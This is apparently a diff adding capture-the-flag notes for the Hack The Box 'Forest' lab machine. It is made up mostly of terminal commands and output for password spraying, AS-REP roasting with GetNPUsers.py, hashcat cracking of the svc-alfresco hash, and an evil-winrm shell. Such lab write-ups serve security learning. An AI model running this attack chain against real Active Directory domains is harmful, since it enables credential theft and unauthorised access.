@@ -782,3 +782,197 @@ rpcclient $> queryuser 0x47b
         logon_hrs[0..21]...
 rpcclient $> 
 ```
+
+
+
+```
+crackmapexec smb 10.129.95.210 -u userlist.ldap -p pass 
+SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019april2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019April2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019ApriL2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019AprIl2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019ApRil2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019APril2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019august2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019August2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019AugusT2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019AuguSt2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019AugUst2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019AuGust2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019AUgust2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019autumn2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019Autumn2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019AutumN2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019AutuMn2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019AutUmn2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019AuTumn2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019AUtumn2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019december2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019December2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019DecembeR2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019DecembEr2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019DecemBer2 STATUS_LOGON_FAILURE 
+SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019DeceMber2 STATUS_LOGON_FAILURE 
+-----------------------------------------------------snip--------------------------------------------------------------------
+```
+
+
+
+```
+(root💀oliver)-[/usr/share/doc/python3-impacket/examples]
+└─# python3 GetNPUsers.py -dc-ip 10.129.95.210 -request 'htb.local/'                                                                                                                  127 ⨯
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
+------------  ------------------------------------------------------  --------------------------  --------------------------  --------
+svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2021-12-19 08:44:15.886122  2019-09-23 16:39:47.931194  0x410200 
+
+
+
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:397080050ef09a3d3913b2f6280aaac9$070b992609688bb54f0ebf15ea8d6b384f7eda8db49ee0b19fa1b228cea257c38616e52fdd7450a375085d507f9bea610f85ca3789a457af0bb148db22fc84bbac77a223e7439f300c5b73dc6ea14dc07a42e2275d5203d63f3b419998b1d9fea60ad06560602ab42ff94be4a9953fe537dab7ebbd8f0c0eb7623b3e3d8df025ed226dd34d2dc17424e5cef45c58dd99588aed77ed04651afe42e6abe6bcd1e267aaa0612a43cf14fdbfcc108a30b0571c945809e4bf76ae0897b3bbf0c2556ea6171369cce5e127d4a9ea21fc30f8d2cab0f5ad5ff79e04f23b7d7003a950cfa87be09abb17
+                                                                                                                                                                                            
+┌──(root💀oliver)-[/usr/share/doc/python3-impacket/examples]
+└─# python3 GetNPUsers.py -dc-ip 10.129.95.210 -request 'htb.local/' -format hashcat
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
+------------  ------------------------------------------------------  --------------------------  --------------------------  --------
+svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2021-12-19 08:44:15.886122  2021-12-19 08:44:52.307826  0x410200 
+
+
+
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:46e9774412bd1ad21a4fce3e5c8341ee$352643c79f9849aaaacf1954b040da65e25260f55cf5aff50e3def71543899d3759be9af00f51c711ed517d894c1fa650c08d1c68a6451d2c51feb284eabddaec1a7b6bc4491db727b939f7353ae0b63735e0a16aa6fc4de44ecceabc086e4feae942b8c830d138917dcea47673e362321c32f2d29c7f06f33afc065913654375d8b89eaeaeb9bb19e41583f24a1e05e3f0040dd0d0a36eb3bf2c6513a5976b9aa8c4434ed196bc6cdf133ffe7b17c6e1dc2caa0c15e51a6f58cef8c2039089c74669ba2a699b895386e3466dce404fce9b1f3643cb979d3d634f0c320a21cb76bfacb227d60
+
+
+```
+
+```
+(root💀oliver)-[~/Downloads/hackthebox/Forest]
+└─# hashcat --example-hashes | grep -i krb
+HASH: $krb5pa$23$user$realm$salt$5cbb0c882a2b26956e81644edbdb746326f4f5f0e947144fb3095dffe4b4b03e854fc1d631323632303636373330383333353630
+HASH: $krb5tgs$23$*user$realm$test/spn*$b548e10f5694ae018d7ad63c257af7dc$35e8e45658860bc31a859b41a08989265f4ef8afd75652ab4d7a30ef151bf6350d879ae189a8cb769e01fa573c6315232b37e4bcad9105520640a781e5fd85c09615e78267e494f433f067cc6958200a82f70627ce0eebc2ac445729c2a8a0255dc3ede2c4973d2d93ac8c1a56b26444df300cb93045d05ff2326affaa3ae97f5cd866c14b78a459f0933a550e0b6507bf8af27c2391ef69fbdd649dd059a4b9ae2440edd96c82479645ccdb06bae0eead3b7f639178a90cf24d9a
+HASH: $krb5asrep$23$user@domain.com:3e156ada591263b8aab0965f5aebd837$007497cb51b6c8116d6407a782ea0e1c5402b17db7afa6b05a6d30ed164a9933c754d720e279c6c573679bd27128fe77e5fea1f72334c1193c8ff0b370fadc6368bf2d49bbfdba4c5dccab95e8c8ebfdc75f438a0797dbfb2f8a1a5f4c423f9bfc1fea483342a11bd56a216f4d5158ccc4b224b52894fadfba3957dfe4b6b8f5f9f9fe422811a314768673e0c924340b8ccb84775ce9defaa3baa0910b676ad0036d13032b0dd94e3b13903cc738a7b6d00b0b3c210d1f972a6c7cae9bd3c959acf7565be528fc179118f28c679f6deeee1456f0781eb8154e18e49cb27b64bf74cd7112a0ebae2102ac
+HASH: $krb5tgs$17$srv_http$synacktiv.local$849e31b3db1c1f203fa20b85$948690f5875125348286ad3346d27b43eaabc71896b620c16de7ddcdbd561628c650c508856a3f574261948b6db4b48332d30536e978046a423ad4368f9a69b4dc4642dab4e0d475d8299be718fd6f98ac85a771b457b2453e78c9411dfce572b19660fe7a5a8246d9b2a91ea2f14d1986ea0a77ecf9b8330bc8fd9ab540bcf46b74c5aa7005cfccd89ec05f66aeab30c6b2bf8595cf6c9a1b68ad885258850c4b1dd9265f270fb2af52fd76c16246df51ea67efc58a65c345686c84e43642febe908a
+HASH: $krb5tgs$18$srv_http$synacktiv.local$16ce51f6eba20c8ee534ff8a$57d07b23643a516834795f0c010da8f549b7e65063e5a367ca9240f9b800adad1734df7e7d5dd8307e785de4f40aacf901df41aa6ce695f8619ec579c1fa57ee93661cf402aeef4e3a42e7e3477645d52c09dc72feade03512dffe0df517344f673c63532b790c242cc1d50f4b4b34976cb6e08ab325b3aefb2684262a5ee9faacb14d059754f50553be5bfa5c4c51e833ff2b6ac02c6e5d4c4eb193e27d7dde301bd1ddf480e5e282b8c27ef37b136c8f140b56de105b73adeb1de16232fa1ab5c9f6
+HASH: $krb5pa$17$hashcat$HASHCATDOMAIN.COM$a17776abe5383236c58582f515843e029ecbff43706d177651b7b6cdb2713b17597ddb35b1c9c470c281589fd1d51cca125414d19e40e333
+HASH: $krb5pa$18$hashcat$HASHCATDOMAIN.COM$96c289009b05181bfd32062962740b1b1ce5f74eb12e0266cde74e81094661addab08c0c1a178882c91a0ed89ae4e0e68d2820b9cce69770
+                                                                                                                                                                                            
+┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
+└─# hashcat --example-hashes | less       
+                                                                                                                                                                                            
+┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
+└─# hashcat -m 18200 hash-alfresco /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule 
+hashcat (v6.1.1) starting...
+
+* Device #1: WARNING! Kernel exec timeout is not disabled.
+             This may cause "CL_OUT_OF_RESOURCES" or related errors.
+             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
+* Device #2: WARNING! Kernel exec timeout is not disabled.
+             This may cause "CL_OUT_OF_RESOURCES" or related errors.
+             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
+nvmlDeviceGetFanSpeed(): Not Supported
+
+CUDA API (CUDA 11.4)
+====================
+* Device #1: NVIDIA GeForce GTX 1650, 3856/3911 MB, 14MCU
+
+OpenCL API (OpenCL 3.0 CUDA 11.4.158) - Platform #1 [NVIDIA Corporation]
+========================================================================
+* Device #2: NVIDIA GeForce GTX 1650, skipped
+
+OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 9.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
+====================================================================================================================================
+* Device #3: pthread-AMD Ryzen 7 4800H with Radeon Graphics, skipped
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 3120
+
+Applicable optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
+If you want to switch to optimized backend kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 309 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 44754481200
+* Runtime...: 1 sec
+
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:46e9774412bd1ad21a4fce3e5c8341ee$352643c79f9849aaaacf1954b040da65e25260f55cf5aff50e3def71543899d3759be9af00f51c711ed517d894c1fa650c08d1c68a6451d2c51feb284eabddaec1a7b6bc4491db727b939f7353ae0b63735e0a16aa6fc4de44ecceabc086e4feae942b8c830d138917dcea47673e362321c32f2d29c7f06f33afc065913654375d8b89eaeaeb9bb19e41583f24a1e05e3f0040dd0d0a36eb3bf2c6513a5976b9aa8c4434ed196bc6cdf133ffe7b17c6e1dc2caa0c15e51a6f58cef8c2039089c74669ba2a699b895386e3466dce404fce9b1f3643cb979d3d634f0c320a21cb76bfacb227d60:s3rvice
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, AS-REP
+Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:46e9774412bd1a...227d60
+Time.Started.....: Sun Dec 19 08:49:01 2021 (2 secs)
+Time.Estimated...: Sun Dec 19 08:49:03 2021 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Mod........: Rules (/usr/share/hashcat/rules/InsidePro-PasswordsPro.rule)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........: 26556.9 kH/s (4.99ms) @ Accel:2 Loops:128 Thr:64 Vec:1
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 29560832/44754481200 (0.07%)
+Rejected.........: 0/29560832 (0.00%)
+Restore.Point....: 8960/14344385 (0.06%)
+Restore.Sub.#1...: Salt:0 Amplifier:768-896 Iteration:0-128
+Candidates.#1....: 01+0106 -> ble0s
+Hardware.Mon.#1..: Temp: 50c Util: 56% Core:1785MHz Mem:5000MHz Bus:8
+
+Started: Sun Dec 19 08:48:38 2021
+Stopped: Sun Dec 19 08:49:03 2021
+                                                                                                                                                                                            
+┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
+└─# nvim cred         
+                                                                                                                                                                                            
+┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
+└─# crackmapexec smb 10.129.95.210 -u svc-alfresco -p s3rvice         
+SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+SMB         10.129.95.210   445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
+                                                                                                                                                                                            
+┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
+└─# crackmapexec smb 10.129.95.210 -u svc-alfresco -p s3rvice --shares
+SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+SMB         10.129.95.210   445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
+SMB         10.129.95.210   445    FOREST           [+] Enumerated shares
+SMB         10.129.95.210   445    FOREST           Share           Permissions     Remark
+SMB         10.129.95.210   445    FOREST           -----           -----------     ------
+SMB         10.129.95.210   445    FOREST           ADMIN$                          Remote Admin
+SMB         10.129.95.210   445    FOREST           C$                              Default share
+SMB         10.129.95.210   445    FOREST           IPC$                            Remote IPC
+SMB         10.129.95.210   445    FOREST           NETLOGON        READ            Logon server share 
+SMB         10.129.95.210   445    FOREST           SYSVOL          READ            Logon server share 
+                                                                                                          
+```
+
+
+```
+(root💀oliver)-[~/Downloads/hackthebox/Forest]
+└─# evil-winrm -u svc-alfresco -p s3rvice -i 10.129.95.210
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
+htb\svc-alfresco
+```
